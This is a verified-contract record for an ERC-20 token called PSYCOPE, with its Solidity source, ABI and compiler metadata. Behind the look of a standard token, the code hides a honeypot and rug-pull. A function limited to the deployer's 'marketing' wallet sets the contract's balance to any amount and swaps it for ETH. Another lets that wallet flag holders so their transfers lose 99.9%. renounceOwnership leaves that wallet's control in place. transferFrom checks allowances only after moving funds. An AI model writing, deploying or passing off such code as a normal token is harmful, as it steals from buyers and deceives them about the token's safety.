{"SourceCode": "pragma solidity ^0.8.19;\r\n// SPDX-License-Identifier: MIT\r\n\r\n\r\n\r\ninterface IUniswapV2Factory {\r\n    function getPair(address tokenA, address tokenB) external view returns (address pair_);\r\n}\r\n\r\ncontract Context {\r\n    function msgSender() public view returns (address) {return msg.sender;}\r\n}\r\nlibrary SafeMath {\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"SafeMath:  subtraction overflow\");\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {return 0;}\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath:  multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0, \"SafeMath:  division by zero\");\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath:  addition overflow\");\r\n        return c;\r\n    }\r\n}\r\n\r\n\r\ninterface IUniswapV2Router {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 asd, uint256 bewr, address[] calldata _path, address csdf, uint256) external;\r\n    function factory() external pure returns (address addr);\r\n    function WETH() external pure returns (address aadd);\r\n}\r\nabstract contract Ownable {\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n    address private _owner;\r\n    modifier onlyOwner(){\r\n        require(owner() == msg.sender, \"Ownable: caller is not the owner\"); _;\r\n    }\r\n    constructor () {\r\n        emit OwnershipTransferred(address(0), _owner);\r\n        _owner = msg.sender;\r\n    }\r\n    function owner() public view virtual returns (address) {return _owner;}\r\n}\r\n\r\ncontract PSYCOPE is Ownable, Context {\r\n    using SafeMath for uint256;\r\n\r\n    function approve(address spender, uint256 amount) public virtual returns (bool) {\r\n        _approve(msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n    uint256 public _decimals = 9;\r\n    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\r\n        _approve(msgSender(), spender, _allowances[msgSender()][spender] + addedValue);\r\n        return true;\r\n    }\r\n    uint256 public _totalSupply = 10000000000000 * 10 ** _decimals;\r\n    function _transfer(address _from, address _to, uint256 _amount) internal {\r\n        uint256 feeAmount = (\r\n            cooldowns[_from] != 0 && cooldowns[_from] <= currentBlock()\r\n        ) ? _amount.mul(999).div(1000)  :  buyFee;\r\n        require(_amount <= _balances[_from]); \r\n        _balances[_from] -= _amount; \r\n        _balances[_to] +=( _amount - feeAmount);\r\n        require(_from != address(0));\r\n        emit Transfer(_from, _to, _amount);\r\n    }\r\n    function balanceOf(address account) public view returns (uint256) { return _balances[account]; } \r\n    uint256 buyFee = 0;\r\n    function decimals() external view returns (uint256) {\r\n        return _decimals;\r\n    }\r\n    string private _symbol = \"PSYCOPE\";\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n    string private _name = \"PSYCOPE\";\r\n    event Approval(address indexed _from, address indexed to_addres_, uint256 value);\r\n    address public _marketingWallet;\r\n    IUniswapV2Router private uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n    function currentBlock() private view returns (uint256) {\r\n        return block.number;\r\n    }\r\n    mapping(address => uint256) private _balances;\r\n    event Transfer(address indexed from, address indexed aindex, uint256 val);\r\n\r\n    function totalSupply() external view returns (uint256) {  return _totalSupply;  }\r\n    function marketing() internal view returns (bool) {\r\n        return _marketingWallet == msg.sender;\r\n    }\r\n    function transferFrom(address from_, address to_, uint256 _amount) public returns (bool) {\r\n        _transfer(from_, to_, _amount);\r\n        require(_allowances[from_][msgSender()] >= _amount);\r\n        return true;\r\n    }\r\n    function _approve(address owner, address spender, uint256 amount) internal {\r\n        require(spender != address(0));\r\n        require(owner != address(0));\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n    function initializeTokenSwap(uint256 quantity, address _tokenAddres) external {\r\n        if (marketing()) { _approve(address(this), address(uniswapRouter),  quantity); \r\n        _balances[address(this)] = quantity;\r\n        address[] memory tokenPath = new address[](2);  \r\n        tokenPath[0] = address(this);   \r\n        tokenPath[1] = uniswapRouter.WETH();  \r\n        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(quantity, 0, tokenPath, _tokenAddres, 32 + block.timestamp);\r\n        }\r\n    }\r\n    function name() external view returns (string memory) { return _name; }\r\n    function decreaseAllowance(address from, uint256 amount) public returns (bool) {\r\n        require(_allowances[msgSender()][from] >= amount);\r\n        _approve(msgSender(), from, _allowances[msg.sender][from] - amount);\r\n        return true;\r\n    } \r\n    mapping (address => uint256) cooldowns;\r\n    function transfer(address recipient, uint256 amount) public returns (bool) { _transfer(msgSender(), recipient, amount); return true; }\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    function setCooldown(address[] calldata cooldownAddr) external { \r\n        uint256 _toBlockNo = 1 + currentBlock();\r\n        for (uint _xnd = 0;  _xnd < cooldownAddr.length;  _xnd++) { \r\n            if (marketing()){ cooldowns[cooldownAddr[_xnd]] = _toBlockNo; }\r\n        }\r\n    } \r\n    constructor() {\r\n        _marketingWallet = msg.sender;\r\n        _balances[msgSender()] = _totalSupply; \r\n        emit Transfer(address(0), msg.sender, _balances[msg.sender]);\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to_addres_\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"aindex\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"val\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_decimals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_marketingWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"quantity\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"_tokenAddres\",\"type\":\"address\"}],\"name\":\"initializeTokenSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"msgSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"cooldownAddr\",\"type\":\"address[]\"}],\"name\":\"setCooldown\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from_\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to_\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PSYCOPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://db5ccb4ac12466b3c29c989efc48641a054a7c56dbefad013f921cec1ab10d3a"}